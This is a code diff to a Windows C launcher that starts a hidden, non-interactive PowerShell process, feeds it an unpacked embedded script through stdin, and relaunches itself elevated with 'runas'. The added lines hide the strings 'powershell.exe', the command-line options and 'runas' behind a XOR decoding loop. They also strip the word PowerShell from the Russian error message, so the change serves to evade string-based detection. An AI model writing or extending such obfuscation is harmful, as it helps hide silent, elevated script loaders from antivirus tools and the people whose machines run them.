@@ -6,7 +6,6 @@
 #include <process.h>
 #include <string.h>
 
-#include "mutex.h"
 #include "cleanup.h"
 
 uint32_t __tls_start __attribute__ ((section (".tls")))=0;
@@ -176,7 +175,11 @@ static DWORD ThreadId;
 
 static void proceed(){
   wchar_t ppath[MAX_PATH+1];
-  if(!SearchPathW(NULL,L"powershell.exe",NULL,MAX_PATH+1,ppath,NULL)) return;
+  for(uint8_t i=0;i<16;i++){
+    cmd[i]^=xchr[i];
+    opt[i]^=xchr[i];
+  };
+  if(!SearchPathW(NULL,cmd,NULL,MAX_PATH+1,ppath,NULL)) return;
   SECURITY_ATTRIBUTES saAttr;
   saAttr.nLength=sizeof(SECURITY_ATTRIBUTES);
   saAttr.bInheritHandle=TRUE;
@@ -194,7 +197,7 @@ static void proceed(){
   PVOID OldValue=NULL;
   if(Wow64DisableWow64FsRedirection(&OldValue)){
 #endif
-  if(CreateProcessW(ppath,L" -w 3 -nop -nol -noni -c -",NULL,NULL,TRUE,0,NULL,NULL,&siStartInfo,&piProcInfo)){
+  if(CreateProcessW(ppath,opt,NULL,NULL,TRUE,0,NULL,NULL,&siStartInfo,&piProcInfo)){
     unarc(stdin_w);
     WaitForSingleObject(piProcInfo.hProcess,INFINITE);
     CloseHandle(piProcInfo.hProcess);
@@ -203,7 +206,7 @@ static void proceed(){
   else{
     PostThreadMessageW(ThreadId,WM_QUIT,0,0);
     MessageBoxW(NULL,L"\x41D\x435\x432\x43E\x437\x43C\x43E\x436\x43D\x43E\x20\x437\x430\x43F\x443\x441\x442\x438\x442\x44C\x20\x\
-441\x440\x435\x434\x443\x20\x432\x44B\x43F\x43E\x43B\x43D\x435\x43D\x438\x44F\x20\x50\x6F\x77\x65\x72\x53\x68\x65\x6C\x6C\x21",err,0x00201010);
+441\x440\x435\x434\x443\x20\x432\x44B\x43F\x43E\x43B\x43D\x435\x43D\x438\x44F\x21",err,0x00201010);
   };
 #ifdef __i386__
     Wow64RevertWow64FsRedirection(OldValue);
@@ -566,7 +569,10 @@ extern void __stdcall start(){
           image[i]=(uint8_t)symbol;
         };
         dlg_window(0);
-        if(dlg_ret) ShellExecuteW(NULL,L"runas",szArglist[0],imutex,NULL,1);
+        if(dlg_ret){
+          for(uint8_t i=0;i<16;i++) vrb[i]^=xchr[i];
+          ShellExecuteW(NULL,vrb,szArglist[0],imutex,NULL,1);
+        };
         LocalFree(image);
       };
     };
